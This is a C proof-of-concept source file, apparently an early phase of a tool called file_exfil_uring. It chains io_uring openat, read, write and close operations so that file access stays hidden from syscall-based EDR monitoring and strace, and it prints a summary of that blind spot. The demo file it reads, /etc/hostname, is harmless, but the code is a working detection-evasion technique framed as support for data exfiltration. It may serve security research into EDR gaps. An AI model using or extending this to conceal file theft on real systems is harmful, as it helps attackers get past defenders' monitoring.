/*
 * file_exfil_uring.c — Phase 1 PoC: open → read → write → close via io_uring
 *
 * Demonstrates that all file I/O operations are hidden inside io_uring_enter()
 * and are invisible to syscall-based EDRs.
 *
 * Build: gcc -Wall -O0 -o file_exfil_uring file_exfil_uring.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <stdint.h>
#include <linux/io_uring.h>

#define __NR_io_uring_setup  425
#define __NR_io_uring_enter  426

/* AGENTS.md rule: runtime kernel check with a clear error message. */
static int require_kernel(int major, int minor, const char *feature) {
    struct utsname u = {0};
    int a = 0, b = 0;
    if (uname(&u) != 0 || sscanf(u.release, "%d.%d", &a, &b) < 2) {
        fprintf(stderr, "[-] cannot determine kernel version\n");
        return 0;
    }
    if (a > major || (a == major && b >= minor))
        return 1;
    fprintf(stderr,
            "[-] needs kernel >= %d.%d for %s — this kernel is %s\n",
            major, minor, feature, u.release);
    return 0;
}

static int io_uring_setup(unsigned e, struct io_uring_params *p) {
    return syscall(__NR_io_uring_setup, e, p);
}
static int io_uring_enter(int fd, unsigned sub, unsigned min, unsigned fl, void *s) {
    return syscall(__NR_io_uring_enter, fd, sub, min, fl, s);
}

static struct {
    int fd; struct io_uring_params p;
    void *sq, *cq; unsigned *sq_t, *sq_mk, *sq_arr, *cq_h, *cq_t, *cq_mk;
    struct io_uring_cqe *cqes; struct io_uring_sqe *sqes;
} R;

static void setup(void) {
    R.fd = io_uring_setup(16, &R.p);
    if (R.fd < 0) { perror("setup"); exit(1); }
    size_t ssz = R.p.sq_off.array + R.p.sq_entries * 4;
    size_t csz = R.p.cq_off.cqes  + R.p.cq_entries * sizeof(*R.cqes);
    R.sq   = mmap(0,ssz,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_POPULATE,R.fd,IORING_OFF_SQ_RING);
    R.cq   = (R.p.features & IORING_FEAT_SINGLE_MMAP) ? R.sq
           : mmap(0,csz,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_POPULATE,R.fd,IORING_OFF_CQ_RING);
    R.sqes = mmap(0,R.p.sq_entries*sizeof(*R.sqes),PROT_READ|PROT_WRITE,
                  MAP_SHARED|MAP_POPULATE,R.fd,IORING_OFF_SQES);
    R.sq_t=R.sq+R.p.sq_off.tail; R.sq_mk=R.sq+R.p.sq_off.ring_mask;
    R.sq_arr=R.sq+R.p.sq_off.array;
    R.cq_h=R.cq+R.p.cq_off.head; R.cq_t=R.cq+R.p.cq_off.tail;
    R.cq_mk=R.cq+R.p.cq_off.ring_mask; R.cqes=R.cq+R.p.cq_off.cqes;
}

static int submit(uint8_t op, int fd, void *addr, uint32_t len, uint64_t ud) {
    unsigned i = *R.sq_t & *R.sq_mk;
    struct io_uring_sqe *s = &R.sqes[i];
    memset(s, 0, sizeof(*s));
    s->opcode=op; s->fd=fd; s->addr=(uint64_t)(uintptr_t)addr;
    s->len=len; s->user_data=ud;
    R.sq_arr[i]=i; (*R.sq_t)++;
    if (io_uring_enter(R.fd,1,1,IORING_ENTER_GETEVENTS,NULL) < 0) {
        perror("io_uring_enter"); exit(1);
    }
    int res = R.cqes[*R.cq_h & *R.cq_mk].res;
    (*R.cq_h)++;
    return res;
}

int main(void) {
    if (!require_kernel(5, 6, "IORING_OP_OPENAT/READ/WRITE/CLOSE chain"))
        return 1;

    setup();
    char buf[1024] = {0};

    int fd = submit(IORING_OP_OPENAT, AT_FDCWD, "/etc/hostname", O_RDONLY, 1);
    if (fd < 0) { fprintf(stderr,"openat failed: %d\n",fd); return 1; }

    int n = submit(IORING_OP_READ, fd, buf, sizeof(buf)-1, 2);
    if (n < 0) { fprintf(stderr,"read failed: %d\n",n); return 1; }
    buf[n] = '\0';

    submit(IORING_OP_WRITE, STDOUT_FILENO, buf, (uint32_t)n, 3);
    submit(IORING_OP_CLOSE, fd, NULL, 0, 4);
    close(R.fd);

    fprintf(stderr,"\n=== EDR VISIBILITY ===\n");
    fprintf(stderr,"Traditional: openat + read + write + close (4 syscalls visible)\n");
    fprintf(stderr,"io_uring:    io_uring_enter x4  (individual ops hidden inside)\n");
    fprintf(stderr,"strace -e trace=openat,read,write,close shows NOTHING for io_uring\n");
    return 0;
}
